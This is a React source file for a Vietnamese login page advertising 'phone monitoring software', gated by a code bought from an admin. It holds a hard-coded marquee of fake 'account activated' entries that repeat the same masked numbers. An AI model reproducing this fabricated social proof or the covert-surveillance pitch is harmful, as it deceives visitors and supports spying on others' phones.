import { Box, Button, Grid, MenuItem, Select, TextField, Typography } from "@mui/material";
import image from "../../assets/img";
import { Controller, useForm } from "react-hook-form";
import './style.css'
import phoneNumber from "../../component/phoneNumber";
import { useEffect, useState } from "react";
import { LoadingButton } from "@mui/lab";
import { useNavigate } from "react-router-dom";
import apiService from "../../service/apiService";
import API_PATHS from "../../config/api";
import { toast } from "react-toastify";
import { ROUTES } from "../../config/routes";
interface FormLLogin {
    code: string
    phone: string
}
function LoginPage() {
    const [messageError, setMessageError] = useState('')
    const [loading, setLoading] = useState(false)

    const {
        control,
        handleSubmit,
        formState: { errors },
    } = useForm<FormLLogin>();

    useEffect(() => {
        if (errors.phone?.type === 'pattern') {
            setMessageError('Vui lòng nhập đúng định dạng số điện thoại')
        } else if (Object.keys(errors).length !== 0) {
            setMessageError('Vui lòng điền đủ thông tin.')
        } else {
            setMessageError('')
        }
    }, [errors.code?.type, errors.phone?.type])
    const navigate = useNavigate()
    const onSubmit = (data: FormLLogin) => {
        const addressService = localStorage.getItem('addressService')
        if (addressService) {
            const address = JSON.parse(addressService)
            if (!address.link) {
                toast.error('Vui lòng chọn một dịch vụ')
                navigate('/')
                return
            }
            setMessageError('')
            setLoading(true)
            if (address.link === '/zalo') {
                apiService('post', API_PATHS.VERIFY_CODE_ZALO + data.code, {})
                    .then((data) => {
                        setLoading(false)
                        localStorage.setItem('infoUser', JSON.stringify(data))
                        navigate(ROUTES.loading)
                    })
                    .catch((error) => {
                        setMessageError(error.response.data.message)
                        setLoading(false)

                    })
            } else {
                apiService('post', API_PATHS.VERIFY_CODE + data.code, {})
                    .then(() => {
                        setLoading(false)
                        navigate(ROUTES.loading)

                    })
                    .catch((error) => {
                        console.log(error)
                        setMessageError(error.response.data.message)
                        setLoading(false)

                    })
            }

        } else {
            toast.error('Vui lòng chọn một dịch vụ')
            navigate('/')
        }

    }
    return (<Box sx={{ backgroundImage: `url('https://img.freepik.com/free-vector/realistic-background-futuristic-style_23-2149129125.jpg?w=1380&t=st=1704423779~exp=1704424379~hmac=6d7877ed4410a17e8c7fa41ba7b61192ecf77531c2455e860a5a63784e289ad3')`, minHeight: '100vh', backgroundSize: 'cover', backgroundPosition: '77% 31%', backgroundRepeat: 'no-repeat', display: 'flex', justifyContent: 'center', alignItems: 'center', flexDirection: 'column' }}>
        <Typography variant="h2" align="center" sx={{ margin: '24px', color: '#fff', fontSize: { sm: '32px', xs: '24px' }, fontWeight: 500, textShadow: '0px 1px 2px #ccc' }}>PHẦN MỀM GIÁM SÁT ĐIỆN THOẠI</Typography>
        <Box sx={{ width: { md: '50%', xs: '95%' }, padding: { sm: '24px', xs: '15px' }, backgroundColor: '#5a2d2d6b', borderRadius: '0.25rem', marginBottom: "20px", }}>
            <Grid container sx={{}}>
                {Array.from({ length: 6 }).map((_, index: any) => {
                    const coat: 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 = index + 1
                    return <Grid key={index} md={4} sm={4} xs={4} item sx={{ padding: '10px' }}  >
                        <img alt='vn' src={image[`img${coat}`]} style={{}} className="w-100" />
                    </Grid>
                })}
            </Grid>
            <Box sx={{ padding: '10px', width: '100%', marginTop: '20px' }}>
                <Typography sx={{ color: '#fff', fontWeight: '700', marginBottom: '10px' }}>SỐ ĐIỆN THOẠI:</Typography>
                <Select defaultValue={0} sx={{ backgroundColor: '#fff', width: '100%', borderRadius: '4px' }} size="small" >
                    {phoneNumber.map((el, index) => {
                        return <MenuItem value={index} key={index}>{el}</MenuItem>
                    })}
                </Select>
                <Controller
                    name="phone"
                    defaultValue=""
                    control={control}
                    rules={{ required: true, pattern: /^0\d{9}$/ }}
                    render={({ field }: any) => (
                        <TextField sx={{ backgroundColor: '#fff', width: '100%', borderRadius: '4px', marginTop: '5px', outline: 'none' }} {...field} size="small" />

                    )}
                />
                <Typography sx={{ color: '#fff', fontWeight: '700', marginBottom: '10px', marginTop: '20px' }}>MÃ PHẦN MỀM - NHẬN TẠI HOTLINE/ZALO: ADMIN</Typography>
                <Controller
                    name="code"
                    defaultValue=""
                    control={control}
                    rules={{ required: true }}
                    render={({ field }: any) => (
                        <TextField sx={{ backgroundColor: '#fff', width: '100%', borderRadius: '4px', marginTop: '5px', outline: 'none' }} {...field} size="small" />
                    )}
                />
                <Box>
                    {messageError && <Typography variant="body1" sx={{
                        fontSize: '16px',
                        color: '#f44336',
                        marginTop: '10px'
                    }} align="center">{messageError}</Typography>}
                </Box>
                <Box sx={{ width: '100%', display: 'flex', justifyContent: 'center', margin: '15px 0' }}>
                    <LoadingButton loading={loading} variant="contained" size="large" onClick={handleSubmit(onSubmit)}>Đăng nhập</LoadingButton>
                </Box>
                <Box>
                    <div className="marquee-container">
                        <div className="marquee-content">
                            Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0397.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0369.742.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0972.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0982.540.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0983.314.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.120.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0969.380.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0585.360.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0882.710.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0982.530.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0972.320.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0908.752.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0282.574.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0762.036.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0828.520.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0353.860.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0356.508.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0362.568.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0868.786.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0369.174.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0972.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0982.540.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0983.314.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0397.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0369.742.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.120.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0969.380.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0585.360.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0394.145.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0872.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0972.053.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.147.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0973.256.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0961.862.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0962.751.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0963.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0353.174.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0356.178.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0397.142.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0369.742.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản:0972.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0982.540.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0983.314.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0971.120.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0969.380.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0585.360.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0858.240.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0911.340.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0912.757.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0913.825.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0824.175.xxx Đã Kích Hoạt Thành Công<br />
                            Tài khoản: 0967.785.xxx Đã Kích Hoạt Thành Công<br />
                        </div>
                    </div>
                </Box>
            </Box>
        </Box>
    </Box >)
}

export default LoginPage;